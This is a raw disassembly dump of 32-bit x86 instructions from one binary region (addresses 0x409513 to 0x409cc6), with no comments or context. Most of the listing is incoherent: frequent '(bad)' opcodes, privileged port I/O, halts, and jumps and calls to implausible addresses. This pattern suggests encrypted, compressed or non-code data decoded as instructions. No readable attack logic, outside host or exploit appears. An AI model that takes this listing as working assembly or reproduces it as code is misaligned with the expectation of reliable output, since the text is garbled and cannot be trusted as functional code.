  409513:	out    0xd5,al
  409515:	(bad)  
  409516:	xor    BYTE PTR [ecx+0x17],dh
  409519:	mov    ds:0xf9c5bb82,al
  40951e:	je     0x4094bf
  409520:	fwait
  409521:	push   edi
  409522:	mov    esi,0xb4eda9cb
  409527:	push   edx
  409528:	out    0xa6,al
  40952a:	cmp    eax,0x6ff6cabf
  40952f:	xchg   BYTE PTR [ebx+eax*1],al
  409532:	push   0x6e43870c
  409537:	fnstsw WORD PTR [edx-0x1280e033]
  40953d:	jns    0x409593
  40953f:	xchg   DWORD PTR [bp+di+0xf],esi
  409543:	cmp    al,0xce
  409545:	out    0xd6,al
  409547:	sub    DWORD PTR [esi+0x5b],eax
  40954a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40954b:	adc    BYTE PTR [ecx-0x48],dl
  40954e:	das    
  40954f:	mov    esi,0x82000aa7
  409554:	xor    BYTE PTR [ebx-0x3f191c40],0xbc
  40955b:	push   ebp
  40955c:	add    DWORD PTR [ebp-0x6bb3a156],ebx
  409562:	add    esp,eax
  409564:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409565:	pop    es
  409566:	(bad)  
  409567:	in     al,0x48
  409569:	cmp    ebp,DWORD PTR [edi-0x6cb7d140]
  40956f:	add    eax,0xca63c78c
  409574:	mov    dl,0x5c
  409576:	data16 sahf 
  409578:	mov    al,0x7f
  40957a:	inc    esp
  40957b:	in     eax,dx
  40957c:	mov    ebp,0x381f923
  409581:	shl    cl,0x78
  409584:	call   DWORD PTR [ecx-0x20]
  409587:	rcl    DWORD PTR [esi],cl
  409589:	imul   ebp,DWORD PTR ds:[ebp+0x396365fd],0xd8f8515d
  409594:	sub    ebx,DWORD PTR [edi]
  409596:	in     al,dx
  409597:	jns    0x4095e4
  409599:	hlt    
  40959a:	jnp    0x4095dd
  40959c:	cmc    
  40959d:	lods   eax,DWORD PTR ds:[esi]
  40959e:	icebp  
  40959f:	mov    eax,ds:0x7d26e91e
  4095a4:	or     al,0x8d
  4095a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4095a7:	sub    al,0xb
  4095a9:	mov    dl,0xb9
  4095ab:	jae    0x40958b
  4095ad:	cmp    DWORD PTR [ebp-0x7913c6f1],eax
  4095b3:	mov    ds:0x928a2928,al
  4095b8:	push   edx
  4095b9:	fwait
  4095ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095bb:	jmp    0xde3fac56
  4095c0:	cmc    
  4095c1:	(bad)  
  4095c3:	ss ret 0x925a
  4095c7:	mov    BYTE PTR [eax+eiz*4+0x52],0x4a
  4095cc:	push   cs
  4095cd:	mov    BYTE PTR [edi],0xec
  4095d0:	pop    ds
  4095d1:	pop    edx
  4095d2:	sub    al,0xa
  4095d4:	jmp    0x71195c6
  4095d9:	add    DWORD PTR [ebx+0x54ad0051],0x32
  4095e0:	call   0x946a28c
  4095e5:	in     eax,dx
  4095e6:	mov    dh,0xe4
  4095e8:	jo     0x409590
  4095ea:	pop    ecx
  4095eb:	out    dx,al
  4095ec:	lea    ebx,[ebx]
  4095ee:	imul   eax,ecx,0x7d5e1db1
  4095f4:	scas   eax,DWORD PTR es:[edi]
  4095f5:	jbe    0x4095cd
  4095f7:	call   0x73a2f374
  4095fc:	daa    
  4095fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4095fe:	hlt    
  4095ff:	dec    ebp
  409600:	mov    dh,0x10
  409602:	cmp    DWORD PTR [ecx],ecx
  409604:	xchg   edi,eax
  409605:	mov    ds,WORD PTR [ebp-0x3b]
  409608:	add    ah,BYTE PTR [edx+0xa986d7b]
  40960e:	(bad)  
  40960f:	cmp    edi,DWORD PTR [eax+0xf9c2f2]
  409615:	mov    dl,0x82
  409617:	retf   0x69e1
  40961a:	xor    al,0x18
  40961c:	jmp    0xd2173c0b
  409621:	inc    ebp
  409622:	fcom   DWORD PTR [ebx]
  409624:	mov    esi,0x3719f3e4
  409629:	scas   al,BYTE PTR es:[edi]
  40962a:	jl     0x4095cb
  40962c:	xchg   ebx,eax
  40962d:	pop    ebx
  40962e:	sub    BYTE PTR [ebp+0x34a5adcd],0xdf
  409635:	push   ebp
  409636:	mov    eax,ds:0x55d750be
  40963b:	popf   
  40963c:	fcmovnb st,st(5)
  40963e:	inc    esp
  40963f:	call   0x1326:0x4cdbdbdb
  409646:	(bad)  
  409647:	call   0xaea175f7
  40964c:	cmp    edi,DWORD PTR [esi+esi*8]
  40964f:	fdivr  st,st(3)
  409651:	sbb    BYTE PTR [ebp-0x63],ch
  409654:	fs mov ah,0x79
  409657:	add    ah,BYTE PTR [ebp+0x44fdfad2]
  40965d:	xor    eax,0x4c4ad550
  409662:	test   DWORD PTR ds:0xa3d9114b,0xc5daccaa
  40966c:	nop
  40966d:	loopne 0x4096c9
  40966f:	push   ds
  409670:	add    BYTE PTR [esi],0x61
  409673:	or     bl,dl
  409675:	mov    DWORD PTR [esi+0x2c],esi
  409678:	mov    eax,ds:0x39e12681
  40967d:	xchg   esp,eax
  40967e:	push   edx
  40967f:	push   ebp
  409680:	adc    dl,al
  409682:	or     al,BYTE PTR [eax]
  409684:	cmp    BYTE PTR [esi+edi*4-0x15],bl
  409688:	ja     0x4096b8
  40968a:	out    dx,eax
  40968b:	sub    al,BYTE PTR [eax]
  40968d:	in     al,dx
  40968e:	out    dx,eax
  40968f:	out    dx,eax
  409690:	jbe    0x409617
  409692:	adc    BYTE PTR [edi+0x8],cl
  409695:	sar    DWORD PTR [ebx-0x53],0xe5
  409699:	push   ecx
  40969a:	add    DWORD PTR [edi-0x6d0325d0],ebx
  4096a0:	(bad)
  4096a3:	sub    ch,BYTE PTR [edi+0x63]
  4096a6:	inc    edi
  4096a7:	pop    esi
  4096a8:	add    al,0x0
  4096aa:	jne    0x40970c
  4096ac:	add    dl,ah
  4096ae:	adc    BYTE PTR [eax-0x7f0d4cf4],dl
  4096b4:	shl    DWORD PTR ds:0xeb44bcf9,1
  4096ba:	add    ah,BYTE PTR [ebx-0x74]
  4096bd:	ja     0x409711
  4096bf:	imul   ebx,DWORD PTR [edi-0x5a2e594b],0x42f5ff76
  4096c9:	jmp    0x95996f25
  4096ce:	sbb    BYTE PTR [ebx+0x30],ah
  4096d1:	pop    edx
  4096d2:	mov    ds:0xa77692cb,eax
  4096d7:	push   ebx
  4096d8:	jae    0x40971a
  4096da:	test   eax,0xd6fb7144
  4096df:	push   ds
  4096e0:	sti    
  4096e1:	jnp    0x4096ad
  4096e3:	(bad)  
  4096e4:	inc    BYTE PTR [ebp-0x3f16b705]
  4096ea:	ret    
  4096eb:	sub    al,0x5a
  4096ed:	xchg   edi,eax
  4096ee:	dec    edx
  4096ef:	and    al,0xbd
  4096f1:	pop    esi
  4096f2:	ret    0xd868
  4096f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4096f6:	(bad)  
  4096f8:	fstp   DWORD PTR [edi]
  4096fa:	xchg   edi,eax
  4096fb:	into   
  4096fc:	sbb    DWORD PTR [eax-0x3dc0f3ec],edi
  409702:	mov    dl,0x8c
  409704:	popf   
  409705:	xor    DWORD PTR ds:0xb68d809f,0xacf55235
  40970f:	aas    
  409710:	push   edi
  409711:	fcom   QWORD PTR [edx+0x4089302b]
  409717:	mov    eax,ds:0xa6a01ec6
  40971c:	in     al,0xab
  40971e:	int3   
  40971f:	or     eax,0xba6a861
  409724:	repz mov esi,0x450c6d00
  40972a:	sub    ecx,ecx
  40972c:	jb     0x4096f9
  40972e:	sub    al,0xb
  409730:	and    eax,DWORD PTR [ebx]
  409732:	sub    eax,0x860477b9
  409737:	ss sub al,0x1a
  40973a:	pop    eax
  40973b:	push   ebx
  40973c:	mov    cl,0x2
  40973e:	jmp    0x4097b2
  409740:	cld    
  409741:	das    
  409742:	mov    esp,0x36a73cf1
  409747:	addr16 pushf 
  409749:	fcomp  st(1)
  40974b:	lods   al,BYTE PTR ds:[esi]
  40974c:	int    0xe8
  40974e:	adc    esp,DWORD PTR [ecx+ecx*1+0x10677104]
  409755:	shl    DWORD PTR [ebp+0x6b],cl
  409758:	sub    eax,0xeb9ba1c3
  40975d:	out    dx,eax
  40975e:	dec    edi
  40975f:	sahf   
  409760:	stc    
  409761:	xor    ebp,DWORD PTR [esi-0x14]
  409764:	push   ss
  409765:	cmp    al,0xf2
  409767:	ficomp WORD PTR [edi+0x14eb7364]
  40976d:	pop    ebx
  40976e:	pop    ebx
  40976f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409770:	push   0xa295bbb5
  409775:	scas   al,BYTE PTR es:[edi]
  409776:	lods   al,BYTE PTR ds:[esi]
  409777:	out    dx,al
  409778:	push   0x6b48d373
  40977d:	mov    esi,0xe32838a2
  409782:	scas   al,BYTE PTR es:[edi]
  409783:	mov    ebp,0x663a0060
  409788:	add    dh,bl
  40978a:	or     al,0x30
  40978c:	cmp    ah,bl
  40978e:	(bad)  
  40978f:	into   
  409790:	nop
  409791:	and    al,0x4d
  409793:	sub    edx,ecx
  409795:	ins    BYTE PTR es:[edi],dx
  409796:	leave  
  409797:	add    al,0x8
  409799:	mov    DWORD PTR [eax-0x33],eax
  40979c:	add    DWORD PTR [esi-0x2f],ecx
  40979f:	retf   
  4097a0:	stc    
  4097a1:	shl    DWORD PTR [edi],1
  4097a3:	add    esi,esi
  4097a5:	div    DWORD PTR [edi+0x15]
  4097a8:	jo     0x4097b4
  4097aa:	clc    
  4097ab:	add    eax,0x3e5893e0
  4097b0:	lods   eax,DWORD PTR gs:[esi]
  4097b2:	jge    0x409780
  4097b4:	pop    eax
  4097b5:	(bad)  [edx-0x32]
  4097b8:	mov    ecx,0x888776c8
  4097bd:	loop   0x409806
  4097bf:	and    DWORD PTR [ebx-0x4bf05138],edi
  4097c5:	ds dec ecx
  4097c7:	push   edx
  4097c8:	push   esp
  4097c9:	xchg   edx,eax
  4097ca:	add    dh,cl
  4097cc:	add    DWORD PTR [edi-0x669ae699],edx
  4097d2:	das    
  4097d3:	retf   0x6f1b
  4097d6:	jecxz  0x40976f
  4097d8:	xchg   BYTE PTR [edi+ebp*1],bh
  4097db:	enter  0x128b,0x1d
  4097df:	inc    edx
  4097e0:	jg     0x4097e0
  4097e2:	ins    DWORD PTR es:[edi],dx
  4097e3:	mov    ebx,0x8fa75446
  4097e8:	int    0x91
  4097ea:	pop    eax
  4097eb:	mov    al,0x50
  4097ed:	cdq    
  4097ee:	cmp    al,0xcf
  4097f0:	sub    DWORD PTR [edx-0x2bdd4afe],ecx
  4097f6:	je     0x4097dd
  4097f8:	jmp    0x614:0x6dc7f64d
  4097ff:	add    eax,0x6f784a24
  409804:	ja     0x4097ce
  409806:	sub    eax,0x67026cf0
  40980b:	push   es
  40980c:	ins    BYTE PTR es:[edi],dx
  40980d:	push   cs
  40980e:	pop    ebp
  40980f:	(bad)  
  409810:	shr    BYTE PTR [ebp-0x64a5e625],1
  409816:	test   edx,ebp
  409818:	das    
  409819:	sub    DWORD PTR [ebp-0x2c],esi
  40981c:	jecxz  0x409828
  40981e:	scas   eax,DWORD PTR es:[edi]
  40981f:	ins    BYTE PTR es:[edi],dx
  409820:	mov    ch,0x9c
  409822:	add    eax,0xb016220c
  409828:	fs iret 
  40982a:	(bad)  
  40982b:	or     DWORD PTR [ecx+edx*8],edi
  40982e:	xchg   esp,eax
  40982f:	loope  0x409846
  409831:	fwait
  409832:	push   0xce891686
  409837:	pop    ss
  409838:	add    eax,DWORD PTR [edi+edi*4+0x4113259d]
  40983f:	js     0x40984d
  409841:	jo     0x409834
  409843:	(bad)  
  409844:	mov    esp,0x9873cc30
  409849:	into   
  40984a:	or     eax,0xe7cc39f3
  40984f:	xchg   edx,eax
  409850:	mov    esp,0x29402c70
  409855:	push   edi
  409856:	dec    esi
  409857:	test   BYTE PTR [ecx],bl
  409859:	xor    DWORD PTR [ebx+0x73fa0e4a],esp
  40985f:	cmc    
  409860:	shr    BYTE PTR [ebx-0x3b1f23dc],cl
  409866:	into   
  409867:	fldcw  WORD PTR [edx+0x7d6937f1]
  40986d:	in     al,dx
  40986e:	and    BYTE PTR [ebx+0x4e],ch
  409871:	xchg   ebp,eax
  409872:	adc    eax,0x3060f903
  409877:	mov    al,ds:0xd5f0e9d3
  40987c:	scas   eax,DWORD PTR es:[edi]
  40987d:	cmp    eax,0x6fe7abc7
  409882:	repz shl BYTE PTR [ebx],0x1f
  409886:	fs imul edi,ebx,0xc
  40988a:	mov    ds:0x1da453ed,eax
  40988f:	mov    bh,0xe8
  409891:	addr16 jne 0x4098f0
  409894:	clc    
  409895:	shl    DWORD PTR [edx+eax*2],cl
  409898:	sub    eax,DWORD PTR [esi+eax*4+0x72]
  40989c:	mov    edx,DWORD PTR [ecx+edx*4-0x26]
  4098a0:	cmp    DWORD PTR [edx-0x2c298cb],eax
  4098a6:	scas   eax,DWORD PTR es:[edi]
  4098a7:	inc    esi
  4098a8:	add    BYTE PTR [edx-0x6],bh
  4098ab:	pop    edi
  4098ac:	adc    al,0x90
  4098ae:	cwde   
  4098af:	or     DWORD PTR [ebx+0x1e3bcb5e],eax
  4098b5:	pop    ss
  4098b6:	int3   
  4098b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4098b8:	stc    
  4098b9:	jl     0x40984e
  4098bb:	leave  
  4098bc:	fs push ebp
  4098be:	js     0x4098f3
  4098c0:	pop    es
  4098c1:	out    dx,al
  4098c2:	fld    TBYTE PTR [edx+0x40]
  4098c5:	mov    cl,0xbc
  4098c7:	arpl   WORD PTR [eax],ax
  4098c9:	sbb    BYTE PTR [edi-0xd29a509],cl
  4098cf:	pop    ecx
  4098d0:	pushf  
  4098d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098d2:	(bad)  
  4098d3:	jecxz  0x4098eb
  4098d5:	ds push 0x2f061dad
  4098db:	cmp    eax,0xc671422c
  4098e0:	sbb    bh,dh
  4098e2:	loop   0x409887
  4098e4:	sahf   
  4098e5:	fidivr WORD PTR [ecx]
  4098e7:	dec    esi
  4098e8:	mov    WORD PTR [ebx],gs
  4098ea:	arpl   WORD PTR [edi],dx
  4098ec:	mov    ah,0xbe
  4098ee:	xchg   ebp,eax
  4098ef:	mov    dh,0xdd
  4098f1:	inc    edx
  4098f2:	sbb    al,0xde
  4098f4:	jmp    0x7c8f362f
  4098f9:	mov    dh,cl
  4098fb:	push   esp
  4098fc:	pushf  
  4098fd:	rcr    BYTE PTR [eax+0x4b],cl
  409900:	pop    ecx
  409901:	xchg   esp,eax
  409902:	fs pop ecx
  409904:	dec    esi
  409905:	mov    eax,ds:0xa1649fb5
  40990a:	fisubr WORD PTR [eax]
  40990c:	bound  ebp,QWORD PTR [edx+0x7f]
  40990f:	dec    edi
  409910:	bound  ebx,QWORD PTR [ebp-0x12]
  409913:	jg     0x409927
  409915:	das    
  409916:	jp     0x409937
  409918:	sub    DWORD PTR [ebx+0x26f9a65b],ecx
  40991e:	pop    ecx
  40991f:	rol    DWORD PTR [esi],1
  409921:	popa   
  409922:	push   ecx
  409923:	ret    0xa4a2
  409926:	inc    ebp
  409927:	dec    edx
  409928:	add    ebp,0xffffffd4
  40992b:	pushf  
  40992c:	nop
  40992d:	add    BYTE PTR [edx],ch
  40992f:	adc    DWORD PTR [edx+edi*1+0x9],esi
  409933:	cmp    DWORD PTR [esi+0x42],0xffffffab
  409937:	and    eax,0x81c6e799
  40993c:	push   ebx
  40993d:	(bad)  
  40993e:	(bad)  
  40993f:	aaa    
  409940:	add    DWORD PTR [eax-0x3a95413b],eax
  409946:	loope  0x40999d
  409948:	arpl   WORD PTR [ebx],ax
  40994a:	les    ecx,FWORD PTR [edx]
  40994c:	add    BYTE PTR [eax-0xb],ah
  40994f:	mov    dh,0xda
  409951:	xor    eax,0xa26336fc
  409956:	popa   
  409957:	jnp    0x4098e6
  409959:	jb     0x4098dc
  40995b:	inc    edx
  40995d:	add    ah,BYTE PTR [eax]
  40995f:	inc    esp
  409960:	add    BYTE PTR fs:[esp+ecx*4+0xd561d40],0x76
  409969:	add    DWORD PTR [edx-0x2d35fd4e],0x52
  409970:	push   0x41
  409972:	loop   0x40991b
  409974:	or     DWORD PTR [esi-0x1c2b4fba],edx
  40997a:	or     bl,al
  40997c:	mov    ebx,0xcb8a0975
  409981:	mov    esp,0xc4b3f1ef
  409986:	dec    ecx
  409987:	cmp    ebp,DWORD PTR [esi+0x58efdcfa]
  40998d:	jmp    0xfdca1ef5
  409992:	add    al,0xc1
  409994:	sbb    ecx,DWORD PTR fs:[ebp-0x641c83ba]
  40999b:	das    
  40999c:	lock popf 
  40999e:	xchg   edi,eax
  40999f:	cs jno 0x409994
  4099a2:	in     al,dx
  4099a3:	adc    ebx,DWORD PTR [eax+edi*1-0x2464ff0b]
  4099aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4099ab:	call   0x7d812126
  4099b0:	mov    esi,ebp
  4099b2:	mov    al,ds:0x5afbcdb4
  4099b7:	aad    0x4e
  4099b9:	mov    ah,0x6d
  4099bb:	adc    al,0xf3
  4099bd:	aas    
  4099be:	bound  eax,QWORD PTR [edi]
  4099c0:	addr16 jo 0x4099c5
  4099c3:	xchg   cl,cl
  4099c5:	inc    ecx
  4099c6:	loop   0x409a2d
  4099c8:	retf   
  4099c9:	mov    ch,0x81
  4099cb:	cs push ebx
  4099cd:	and    al,0xab
  4099cf:	xchg   DWORD PTR [eax],eax
  4099d1:	xchg   DWORD PTR [edi+0x2a],esp
  4099d4:	retf   
  4099d5:	xchg   edx,eax
  4099d6:	add    DWORD PTR [ebx-0x581faa7d],0xffffff81
  4099dd:	icebp  
  4099de:	repnz popf 
  4099e0:	mov    ebp,0xdb7973
  4099e5:	push   eax
  4099e6:	adc    al,0xf9
  4099e8:	xchg   esi,esp
  4099ea:	repz (bad) 
  4099ed:	add    eax,0x9295d7f1
  4099f2:	pop    ds
  4099f3:	dec    esi
  4099f4:	xchg   esp,eax
  4099f5:	jb     0x409a0a
  4099f7:	sbb    eax,0x3274c35a
  4099fc:	mov    eax,ds:0x6706ded0
  409a01:	xor    DWORD PTR [esi+ecx*8+0x1b],0xa804c44f
  409a09:	fisub  DWORD PTR [ebx-0x4766f5ae]
  409a0f:	popa   
  409a10:	cdq    
  409a11:	push   ss
  409a12:	sub    bl,cl
  409a14:	or     cl,0xf4
  409a17:	shr    BYTE PTR [ebp+0x460d6ab8],1
  409a1d:	fwait
  409a1e:	or     dl,BYTE PTR [eax-0xe]
  409a21:	mov    ds:0xf272cf24,al
  409a26:	rcr    cl,cl
  409a28:	hlt    
  409a29:	mov    eax,ds:0xbfb39b42
  409a2e:	fmul   QWORD PTR [ebx+0x2f6b6384]
  409a34:	lds    ebx,FWORD PTR [edx-0x36]
  409a37:	loopne 0x409a39
  409a39:	pop    esp
  409a3a:	sbb    bh,dh
  409a3c:	outs   dx,BYTE PTR ds:[esi]
  409a3d:	sbb    BYTE PTR [eax-0x4b43a3cb],dh
  409a43:	mov    edx,esi
  409a45:	ins    DWORD PTR es:[edi],dx
  409a46:	pop    edx
  409a47:	ins    DWORD PTR es:[edi],dx
  409a48:	out    0xfc,eax
  409a4a:	xchg   ebx,eax
  409a4b:	dec    edx
  409a4c:	loop   0x409a51
  409a4e:	add    BYTE PTR [eax],bl
  409a50:	stos   DWORD PTR es:[edi],eax
  409a51:	std    
  409a52:	jae    0x409a9d
  409a54:	rcr    BYTE PTR [ecx+0x64b69d05],0x63
  409a5b:	nop
  409a5c:	shr    ch,cl
  409a5e:	sub    ah,BYTE PTR [esi-0x2b6598cd]
  409a64:	pop    ecx
  409a65:	ror    BYTE PTR [edx+0x3e57b5b5],0x46
  409a6c:	fsubr  st(3),st
  409a6e:	inc    edi
  409a6f:	cs in  al,dx
  409a71:	push   ebp
  409a72:	sub    al,0x20
  409a74:	out    0xd9,al
  409a76:	push   ebp
  409a77:	cmp    al,0x1f
  409a79:	push   ss
  409a7a:	cdq    
  409a7b:	or     DWORD PTR [ebp+0x2df35fd6],0x889702ac
  409a85:	pop    ecx
  409a86:	clc    
  409a87:	in     eax,dx
  409a88:	(bad)  
  409a89:	jp     0x409a1a
  409a8b:	ja     0x409aee
  409a8d:	cmp    eax,0x85149013
  409a92:	dec    ebx
  409a93:	or     edx,esi
  409a95:	(bad)  
  409a96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a97:	push   ebx
  409a98:	dec    ebx
  409a99:	mov    ecx,0x6407fc22
  409a9e:	mov    bl,0x9
  409aa0:	mov    bh,0xae
  409aa2:	jge    0x409a3b
  409aa4:	daa    
  409aa5:	pop    ds
  409aa6:	jmp    0x409a79
  409aa8:	push   0xffffffb5
  409aaa:	enter  0xacb2,0x9a
  409aae:	enter  0x7833,0xf2
  409ab2:	jecxz  0x409a92
  409ab4:	ds mov esp,0x102a38df
  409aba:	ficom  WORD PTR [edi-0x66]
  409abd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409abe:	mov    WORD PTR [esi+0x23],es
  409ac1:	pop    esi
  409ac2:	cli    
  409ac3:	(bad)  
  409ac4:	stos   DWORD PTR es:[edi],eax
  409ac5:	jl     0x409ab4
  409ac7:	mov    ecx,0xf5b1b3ef
  409acc:	adc    BYTE PTR [edi],ah
  409ace:	dec    edi
  409acf:	cmp    eax,0x69f6d6c4
  409ad4:	push   es
  409ad5:	sbb    ebx,DWORD PTR [ebx-0x80]
  409ad8:	je     0x409a64
  409ada:	fst    DWORD PTR [esi+esi*8+0x66]
  409ade:	cmc    
  409adf:	(bad)  
  409ae0:	aad    0xb5
  409ae2:	mov    edx,0x22fabf6
  409ae7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ae8:	xchg   ebp,eax
  409ae9:	mov    cl,0x18
  409aeb:	jecxz  0x409aa3
  409aed:	push   ebp
  409aee:	data16 or BYTE PTR ds:0xba5b934b,0x69
  409af6:	rol    esi,0x46
  409af9:	scas   eax,DWORD PTR es:[edi]
  409afa:	mov    dl,0xff
  409afc:	push   edi
  409afd:	or     eax,0xd6d6b607
  409b02:	out    0x35,al
  409b04:	mov    edx,ds
  409b06:	jb     0x409ad1
  409b08:	(bad)
  409b0c:	hlt    
  409b0d:	dec    edi
  409b0e:	push   esp
  409b10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b11:	aas    
  409b12:	(bad)  
  409b13:	icebp  
  409b14:	(bad)  
  409b15:	dec    edi
  409b17:	(bad)  
  409b18:	call   0xc024983c
  409b1d:	xor    bl,BYTE PTR [ebp+0x1ee0bb4e]
  409b23:	pusha  
  409b24:	xor    BYTE PTR [eax],bl
  409b26:	jo     0x409b22
  409b28:	hlt    
  409b29:	imul   ebx,esi,0xf9c7defb
  409b2f:	hlt    
  409b30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b31:	push   DWORD PTR [edx]
  409b33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b34:	dec    esi
  409b35:	popf   
  409b36:	and    al,0xcb
  409b38:	xor    cl,BYTE PTR [esi]
  409b3a:	div    BYTE PTR [esi+0x29]
  409b3d:	retf   0xeab2
  409b40:	stc    
  409b41:	shr    DWORD PTR [ecx],0x7b
  409b44:	xchg   edx,eax
  409b45:	mov    dh,0x5c
  409b47:	adc    cl,BYTE PTR [esi]
  409b49:	cs mov cl,0x46
  409b4c:	jmp    0x409ae0
  409b4e:	and    cl,bl
  409b50:	cwde   
  409b51:	xchg   ebp,eax
  409b52:	push   ebx
  409b53:	mov    ecx,ss
  409b55:	ds cmp al,0xe7
  409b58:	(bad)  
  409b59:	iretw  
  409b5b:	repnz cmp BYTE PTR [edi+ecx*8],0x31
  409b60:	(bad)  
  409b61:	iret   
  409b62:	dec    ebx
  409b63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b64:	retf   
  409b65:	or     cl,ch
  409b67:	fwait
  409b68:	push   ds
  409b69:	jecxz  0x409b0e
  409b6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b6c:	test   eax,0xb850abe8
  409b71:	sub    cl,BYTE PTR [ebx]
  409b73:	dec    esp
  409b74:	addr16 mov bl,0x25
  409b77:	inc    edi
  409b78:	mov    WORD PTR [edx+eax*4+0x74b9ccb2],ss
  409b7f:	jns    0x409b8b
  409b81:	ins    BYTE PTR es:[edi],dx
  409b82:	and    ah,BYTE PTR [ebp-0x3dac0135]
  409b88:	(bad)  
  409b89:	in     al,dx
  409b8a:	stos   BYTE PTR es:[edi],al
  409b8b:	jl     0x409ba4
  409b8d:	pop    esi
  409b8e:	jns    0x409c00
  409b90:	dec    esi
  409b91:	int3   
  409b92:	xor    al,0x15
  409b94:	ins    BYTE PTR es:[edi],dx
  409b95:	or     al,0x24
  409b97:	fwait
  409b98:	inc    ebx
  409b99:	leave  
  409b9a:	je     0x409b86
  409b9c:	out    dx,al
  409b9d:	pop    edi
  409b9e:	imul   ecx,DWORD PTR [ebx],0x22
  409ba1:	icebp  
  409ba2:	lea    ebp,[esi]
  409ba4:	sub    BYTE PTR [esp+ebx*8-0x6],bh
  409ba8:	mov    esp,0xcb40d9f2
  409bad:	xor    eax,0xab00f5b5
  409bb2:	adc    eax,0xf5bd1a38
  409bb7:	push   edx
  409bb8:	test   al,0x2f
  409bba:	into   
  409bbb:	or     al,0x8c
  409bbd:	dec    ebp
  409bbe:	push   cs
  409bbf:	jg     0x409b9f
  409bc1:	sbb    cl,BYTE PTR [ebx]
  409bc3:	mov    ch,cl
  409bc5:	xchg   DWORD PTR [eax-0x22],esi
  409bc8:	nop
  409bc9:	fs in  al,0xbf
  409bcc:	xchg   DWORD PTR [ebx-0x4e],edi
  409bcf:	push   cs
  409bd0:	or     al,0xb5
  409bd2:	push   esi
  409bd3:	outs   dx,BYTE PTR ds:[esi]
  409bd4:	or     eax,0x9d30ccbc
  409bd9:	pop    ebx
  409bda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409bdb:	cdq    
  409bdc:	and    ebx,ecx
  409bde:	and    al,0xb9
  409be0:	syscall 
  409be2:	or     ch,BYTE PTR [edx+edx*2]
  409be5:	add    BYTE PTR [eax+0x54],0x69
  409be9:	push   es
  409bea:	(bad)  
  409beb:	push   0x6e
  409bed:	pop    esp
  409bee:	stc    
  409bef:	push   ds
  409bf0:	setg   BYTE PTR [ebp-0x4f]
  409bf4:	mov    cl,0xd1
  409bf6:	scas   eax,DWORD PTR es:[edi]
  409bf7:	test   al,0x7f
  409bf9:	push   eax
  409bfa:	clc    
  409bfb:	mov    eax,0x7e958fc7
  409c00:	push   ebp
  409c01:	mov    eax,0xd6c5294f
  409c06:	(bad)  
  409c07:	push   ss
  409c08:	pop    ss
  409c09:	das    
  409c0a:	pop    esi
  409c0b:	out    0xcb,al
  409c0d:	pop    edi
  409c0e:	jge    0x409bae
  409c10:	mov    ah,0x7b
  409c12:	mov    dl,bl
  409c14:	addr16 ffreep st(3)
  409c17:	(bad)  
  409c18:	into   
  409c19:	sbb    DWORD PTR [edx-0x3],edi
  409c1c:	sub    eax,0x50e855ac
  409c21:	add    ecx,DWORD PTR ds:0x2834bf8a
  409c27:	sub    DWORD PTR [eax-0x5],edx
  409c2a:	push   ebp
  409c2b:	int    0xa2
  409c2d:	inc    ecx
  409c2e:	bound  eax,QWORD PTR [edx-0x71]
  409c31:	pop    edi
  409c32:	mov    ecx,0x7363c02
  409c37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c38:	pop    edi
  409c39:	call   DWORD PTR gs:[edi-0x588fe792]
  409c40:	scas   eax,DWORD PTR es:[edi]
  409c41:	sbb    DWORD PTR [esi-0x22baeb7a],ecx
  409c47:	adc    DWORD PTR [bp+di],ebp
  409c4a:	jnp    0x409c9d
  409c4c:	adc    al,0x47
  409c4e:	lods   eax,DWORD PTR ds:[esi]
  409c4f:	add    eax,0xa3f0af0
  409c54:	dec    esi
  409c55:	ror    BYTE PTR [edi-0x405c0b82],0xa8
  409c5c:	mov    ch,0xfe
  409c5e:	ja     0x409cbf
  409c60:	cld    
  409c61:	loop   0x409c7a
  409c63:	(bad)  [ecx+0x31]
  409c66:	adc    DWORD PTR [esi-0x55],0xffffffc5
  409c6a:	addr16 aas 
  409c6c:	sti    
  409c6d:	pop    ecx
  409c6e:	scas   al,BYTE PTR es:[edi]
  409c6f:	pop    ebp
  409c70:	mov    ebx,0xf0be17c6
  409c75:	add    eax,0xebfc1084
  409c7a:	jg     0x409c79
  409c7c:	outs   dx,DWORD PTR ds:[esi]
  409c7d:	clc    
  409c7e:	int3   
  409c7f:	addr16 ds ret 
  409c82:	(bad)  
  409c84:	sti    
  409c85:	jg     0x409c26
  409c87:	jae    0x409c70
  409c89:	into   
  409c8a:	jno    0x409c7f
  409c8c:	(bad)  
  409c8d:	xor    eax,0xdab4d68c
  409c92:	sbb    eax,0xb792e537
  409c97:	in     eax,0xb3
  409c99:	stc    
  409c9a:	mov    WORD PTR [ebx+ecx*8],?
  409c9d:	mov    esp,0x766c1009
  409ca2:	inc    ebx
  409ca3:	test   eax,0x4679f30d
  409ca8:	xchg   esi,eax
  409ca9:	gs cs and edi,eax
  409cad:	fwait
  409cae:	adc    eax,DWORD PTR [edx+0x50]
  409cb1:	imul   eax,DWORD PTR [eax],0x77
  409cb4:	xchg   edx,eax
  409cb5:	jnp    0x409d08
  409cb7:	hlt    
  409cb8:	push   ebp
  409cb9:	add    DWORD PTR gs:[eax+esi*2-0x6db6bf37],edx
  409cc1:	push   esp
  409cc2:	or     ah,BYTE PTR [edx-0x53]
  409cc5:	inc    ebp
  409cc6:	or     dh,BYTE PTR [edi+0x58c1f01a]
